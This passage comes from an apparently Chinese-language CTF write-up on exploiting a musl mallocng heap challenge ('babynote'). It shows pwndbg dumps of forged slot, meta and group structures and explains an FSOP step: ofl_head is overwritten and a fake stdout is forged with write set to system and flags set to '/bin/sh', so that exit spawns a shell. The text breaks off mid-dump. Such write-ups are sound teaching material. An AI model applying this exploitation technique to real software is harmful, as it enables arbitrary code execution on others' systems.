class=&#34;number&#34;&gt;0x7f22b639fe10&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fd60&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fe20&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000555556925090&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000ff0000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到我们可以通过 b’b’(0x00007f22b63a3dd0 的数据是‘b’) 找到我们的 fake_babynote, 然后释放掉 0x00007f22b6395070 这个伪 slot&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x00007f22b6395070&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-0x60&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b6395010&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b6395020&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b63a7e20&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007f22b63a2e20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b6395030&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b6395060&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000000000003fe&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b6395040&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00000000000000a9&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b6395050&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b6396020&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000c00000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b6395060&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b6395020&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000800000000009&lt;/span&gt;			&lt;span class=&#34;comment&#34;&gt;//伪造的slot堆头&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b6395070&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x4141414141414141&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;			&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b6395080&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b6395090&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;0x7f22b6395060 这个地址就是伪造的 group 的 base 地址，对应的数据就是伪造的 meta 地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422200825484.png&#34; alt=&#34;image-20220422200825484&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422200924302.png&#34; alt=&#34;image-20220422200924302&#34;&gt;&lt;/p&gt;
&lt;p&gt;0x00007f22b63a7e20 这里就是我们的目标地址 - 8，0x00007f22b63a2e20 这个地址是我们下一个申请出来的 slot 的真实地址（申请 0x50）mem==base,&lt;/p&gt;
&lt;p&gt;下面是伪造的 fake_meta1 以及对应的 fake_meta_area1&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422201357563.png&#34; alt=&#34;image-20220422201357563&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后是 free_group 时的伪造的 fake_meta2 和 fake_meta_area&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422201627965.png&#34; alt=&#34;image-20220422201627965&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;fsop&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fsop&#34;&gt;#&lt;/a&gt; FSOP&lt;/h4&gt;
&lt;p&gt;我们任意地址写的，是 ofl_head，类似于 glibc 的 ——IO__lisl_all, 只不过则合理一般情况下是空的，利用在于 exit 函数&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;_Noreturn&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; code)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	__funcs_on_exit();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	__libc_exit_fini();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	__stdio_exit();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	_Exit(code);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; __stdio_exit(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	FILE *f;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (f=*__ofl_lock(); f; f=f-&amp;gt;next) close_file(f);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	close_file(__stdin_used);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	close_file(__stdout_used);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	close_file(__stderr_used);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FILE **__ofl_lock()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	LOCK(ofl_lock);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &amp;amp;ofl_head;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;close_file&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(FILE *f)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!f) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	FFINALLOCK(f);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (f-&amp;gt;wpos != f-&amp;gt;wbase) f-&amp;gt;write(f, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (f-&amp;gt;rpos != f-&amp;gt;rend) f-&amp;gt;seek(f, f-&amp;gt;rpos-f-&amp;gt;rend, SEEK_CUR);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们把 ofl_head 改成我们可以控制的 slot 的地址，就在那里伪造一个 stdout，if (f-&amp;gt;wpos != f-&amp;gt;wbase) f-&amp;gt;write (f, 0, 0); 并满足这里的条件（wpos!=wbase）write 改策划给你 system, 而且会把 fd 作为参数，fd 就是就会指向 flags, 把他写位‘/bin/sh\x00’&lt;/p&gt;
&lt;p&gt;正常的 stdout&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *&lt;span class=&#34;built_in&#34;&gt;stdout&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  flags = &lt;span class=&#34;number&#34;&gt;69&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  rpos = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  rend = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  close = &lt;span class=&#34;number&#34;&gt;0x7f22b61557e5&lt;/span&gt; &amp;lt;__stdio_close&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  wend = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  wpos = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mustbezero_1 = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  wbase = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  write = &lt;span class=&#34;number&#34;&gt;0x7f22b615598e&lt;/span&gt; &amp;lt;__stdio_write&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  seek = &lt;span class=&#34;number&#34;&gt;0x7f22b615597d&lt;/span&gt; &amp;lt;__stdio_seek&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  buf = &lt;span class=&#34;number&#34;&gt;0x7f22b63a6708&lt;/span&gt; &amp;lt;buf+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  buf_size = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prev = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  next = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  pipe_pid = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  lockcount = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mode = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  lock = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  lbf = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cookie = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  off = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  getln_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mustbezero_2 = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  shend = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  shlim = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  shcnt = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prev_locked = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  next_locked = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  locale = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是伪造的 stdout&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p * (FILE * &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt;)&lt;span class=&#34;number&#34;&gt;0x7fc49ff72e20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  flags = &lt;span class=&#34;number&#34;&gt;1852400175&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  rpos = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  rend = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  close = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  wend = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  wpos = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mustbezero_1 = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  wbase = &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt; &amp;lt;error: Cannot access memory at address &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read = &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  write = &lt;span class=&#34;number&#34;&gt;0x7fc49fd1b963&lt;/span&gt; &amp;lt;system&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  seek = &lt;span class=&#34;number&#34;&gt;0x7fc49fd1b963&lt;/span&gt; &amp;lt;system&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  buf_size = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prev = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  next = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd = &lt;span 